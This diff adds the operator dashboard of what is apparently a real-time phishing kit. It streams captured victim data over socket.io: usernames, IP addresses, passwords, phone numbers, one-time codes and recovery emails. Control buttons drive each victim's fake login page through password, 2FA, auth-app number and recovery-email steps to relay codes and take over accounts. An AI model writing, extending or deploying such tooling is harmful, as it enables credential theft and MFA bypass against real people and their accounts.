@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Admin Dashboard</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #f4f4f7; padding: 20px; margin: 0; }
+        .header-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .status { padding: 10px; background: #fff; border-radius: 5px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        .logout-btn { background: #d83b01; color: white; border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer; text-decoration: none; font-weight: bold; }
+        .card { background: #fff; padding: 15px; margin-bottom: 15px; border-radius: 8px; border-left: 5px solid #0078d4; box-shadow: 0 2px 5px rgba(0,0,0,0.05); position: relative; }
+        .controls button { padding: 8px 12px; margin: 5px 5px 0 0; cursor: pointer; border: none; border-radius: 4px; font-weight: bold; font-size: 13px; }
+        .btn-next { background: #0078d4; color: white; }
+        .btn-err { background: #d83b01; color: white; }
+        .btn-delete { background: #555; color: white; position: absolute; top: 15px; right: 15px; padding: 5px 10px; font-size: 12px; border-radius: 4px; border: none; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="header-bar">
+        <div class="status"><strong>Server Status:</strong> <span id="socket_status" style="color: red;">Disconnected</span></div>
+        <a href="/logout" class="logout-btn">Logout</a>
+    </div>
+    <h2>Live User Logs</h2>
+    <div id="log_container"><p id="no_logs">No users connected yet...</p></div>
+
+    <script>
+        const socket = io();
+        socket.on('connect', () => { 
+            const s = document.getElementById('socket_status');
+            s.innerText = "Connected"; s.style.color = "green"; 
+        });
+
+        socket.on('new_log_entry', (data) => {
+            document.getElementById('no_logs').style.display = 'none';
+            const cardId = `log-${data.timestamp.replace(/[: ]/g, '')}-${data.username || 'anon'}`;
+            if(document.getElementById(cardId)) return;
+
+            const div = document.createElement('div');
+            div.className = 'card'; div.id = cardId;
+            div.innerHTML = `
+                <button class="btn-delete" onclick="requestDelete('${data.timestamp}', '${data.username}')">Delete</button>
+                <div><strong>[${data.timestamp}]</strong> User: ${data.username || '...'} | IP: ${data.ipAddress}</div>
+                <div>Step: <span style="color:#0078d4">${data.step}</span></div>
+                ${data.password ? `<div>Pass: <code style=\"background:#eee; padding:2px 4px;\">${data.password}</code></div>` : ''}
+                ${data.phone ? `<div>Phone: <code>${data.phone}</code></div>` : ''}
+                ${data.otp ? `<div>OTP: <code>${data.otp}</code></div>` : ''}
+                ${data.recovery_email ? `<div>Recovery: <code>${data.recovery_email}</code></div>` : ''}
+                <div class="controls">
+                    <button class="btn-next" onclick="control('${data.id}', 'next_to_password')">Accept Email</button>
+                    <button class="btn-err" onclick="control('${data.id}', 'show_pwd_error')">Pwd Error</button>
+                    <button class="btn-next" onclick="control('${data.id}', 'next_to_2fa')">Go to 2FA</button>
+                    <button class="btn-next" style="background:#28a745;" onclick="control('${data.id}', 'finish')">Accept OTP</button>
+                    <button class="btn-err" onclick="control('${data.id}', 'show_2fa_error')">Incorr. OTP</button>
+                    <button class="btn-next" style="background:#28a745;" onclick="triggerAuthApp('${data.id}')">Auth App</button>
+                    <button class="btn-next" style="background:#6c757d;" onclick="control('${data.id}', 'show_recovery_email')">Req Recovery Email</button>
+                    <button class="btn-next" style="background:#17a2b8;" onclick="control('${data.id}', 'next_to_recovery_otp')">Acc Recovery Email</button>
+                    <button class="btn-err" onclick="control('${data.id}', 'show_recovery_otp_error')">Recovery OTP Err</button>
+                    <button class="btn-next" onclick="control('${data.id}', 'finish')">Complete</button>
+                </div>
+            `;
+            document.getElementById('log_container').prepend(div);
+        });
+
+        socket.on('log_deleted', (data) => {
+            const cardId = `log-${data.timestamp.replace(/[: ]/g, '')}-${data.username || 'anon'}`;
+            const el = document.getElementById(cardId);
+            if (el) el.remove();
+        });
+
+        function control(id, action) { socket.emit('admin_action', { targetId: id, action: action }); }
+        function requestDelete(t, u) { if(confirm("Permanently delete this entry?")) socket.emit('delete_log', { timestamp: t, username: u }); }
+        function triggerAuthApp(id) {
+            let d = prompt("Enter 2-digit number:");
+            if (d && d.trim() !== "") socket.emit('admin_action', { targetId: id, action: 'show_auth_num', payload: d });
+        }
+    </script>
+</body>
+</html>
